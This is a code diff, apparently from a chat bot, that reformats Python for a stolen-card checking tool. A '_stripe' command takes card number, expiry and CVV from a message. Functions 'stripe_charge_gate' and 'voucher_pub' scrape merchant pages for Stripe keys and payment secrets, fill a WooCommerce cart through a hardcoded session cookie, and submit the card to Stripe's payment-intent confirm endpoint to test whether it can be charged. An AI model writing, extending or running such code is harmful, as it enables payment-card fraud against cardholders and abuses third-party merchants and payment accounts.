@@ -2,8 +2,8 @@ import re
 from datetime import datetime
 
 import requests
-from requests import Session, get, patch, post
 from aiohttp import ClientSession
+from requests import Session, patch, post
 
 from ._handler import newMsg
 from ._helpers import get_mention, get_text_content
@@ -27,8 +27,7 @@ async def _stripe(e):
     message = await e.reply("`Processing...`")
     cc, exp_mo, exp_year, cvv = arg.split("|", 3)
     start_time = datetime.now()
-    token = tokenize_card(cc.strip(), cvv.strip(),
-                          exp_mo.strip(), exp_year.strip())
+    token = tokenize_card(cc.strip(), cvv.strip(), exp_mo.strip(), exp_year.strip())
     if token is None:
         await message.edit("`Invalid card details.`")
         return
@@ -485,11 +484,9 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
     try:
         resp = client.get(req.url).text
         pk_key = (
-            re.search("var stripe = (.*)",
-                      resp).group(1).split("(")[1].split(")")[0]
+            re.search("var stripe = (.*)", resp).group(1).split("(")[1].split(")")[0]
         )
-        pi_key = re.search(
-            "stripe.confirmCardPayment\('(.*)'\,", resp).group(1)
+        pi_key = re.search("stripe.confirmCardPayment\('(.*)'\,", resp).group(1)
     except:
         return "", ""
 
@@ -498,8 +495,7 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
     data = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=rose&payment_method_data[billing_details][email]=roseloverx%40proton.me&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]=3a86e6fb-a4ad-45e5-b84d-753c14aeca051abe6d&payment_method_data[muid]=cc79fe27-9b43-442c-a8a0-2d99ed7ac3a676a978&payment_method_data[sid]=891e1a39-908f-417d-8be3-46e557d48ad9c0b4ee&payment_method_data[payment_user_agent]=stripe.js%2Fe5a12ae7c%3B+stripe-js-v3%2Fe5a12ae7c&payment_method_data[time_on_page]=69370&expected_payment_method_type=card&use_stripe_sdk=true&key={pk_key}&client_secret={pi_key}"
 
     response = post(
-        "https://api.stripe.com/v1/payment_intents/{}/confirm".format(
-            payment_intent),
+        "https://api.stripe.com/v1/payment_intents/{}/confirm".format(payment_intent),
         headers={
             "content-type": "application/x-www-form-urlencoded",
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
@@ -511,15 +507,17 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
 
 async def voucher_pub(card_number, cvv, exp_mo, exp_year):
     async with ClientSession() as session:
-        await session.post("https://voucherpub.com/wp-admin/admin-ajax.php",
-                           data={
-                               "text[1]": "Url",
-                               "option[1]": "https://www.facebook.com/ananyaapandeyofficial",
-                               "text[2]": "Current Quantity",
-                               "option[2]": "10",
-                               "action": "add_to_cart",
-                               "id": "213",
-                           })
+        await session.post(
+            "https://voucherpub.com/wp-admin/admin-ajax.php",
+            data={
+                "text[1]": "Url",
+                "option[1]": "https://www.facebook.com/ananyaapandeyofficial",
+                "text[2]": "Current Quantity",
+                "option[2]": "10",
+                "action": "add_to_cart",
+                "id": "213",
+            },
+        )
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
         }
@@ -534,27 +532,31 @@ async def voucher_pub(card_number, cvv, exp_mo, exp_year):
                                      "wp_woocommerce_session_6c39cd94485f6fb17cd9987e4c455fa3": "t_7a63fe491748b6ab04fd74535c0952%7C%7C1659335599%7C%7C1659331999%7C%7C59eb1f171f1b91820074316346bff97d",
                                  }, headers=headers)
         response = await req.json()
-        intent = response["redirect"].split(
-            "_secret")[0].split("pi-")[1]
-        client_secret = response["redirect"].split(":")[
-            0].split("pi-")[1]
-        req = await session.post("https://api.stripe.com/v1/payment_intents/{}/confirm".format(
-            intent), headers=headers, data={
-            "expected_payment_method_type": "card",
-            "use_stripe_sdk": "true",
-            "key": "pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi",
-            "client_secret": client_secret,
-        })
+        intent = response["redirect"].split("_secret")[0].split("pi-")[1]
+        client_secret = response["redirect"].split(":")[0].split("pi-")[1]
+        req = await session.post(
+            "https://api.stripe.com/v1/payment_intents/{}/confirm".format(intent),
+            headers=headers,
+            data={
+                "expected_payment_method_type": "card",
+                "use_stripe_sdk": "true",
+                "key": "pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi",
+                "client_secret": client_secret,
+            },
+        )
         response = await req.json()
         if "next_action" in response:
             url = response["next_action"]["use_stripe_sdk"]["stripe_js"]
             await session.get(url)
-        req = await session.get(f"https://api.stripe.com/v1/payment_intents/{intent}",
-                                params={
-                                    "key": "pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi",
-                                    "is_stripe_sdk": "false",
-                                    "client_secret": client_secret,
-                                }, headers=headers)
+        req = await session.get(
+            f"https://api.stripe.com/v1/payment_intents/{intent}",
+            params={
+                "key": "pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi",
+                "is_stripe_sdk": "false",
+                "client_secret": client_secret,
+            },
+            headers=headers,
+        )
         response = await req.json()
         if response.get("next_action") is not None:
             return (
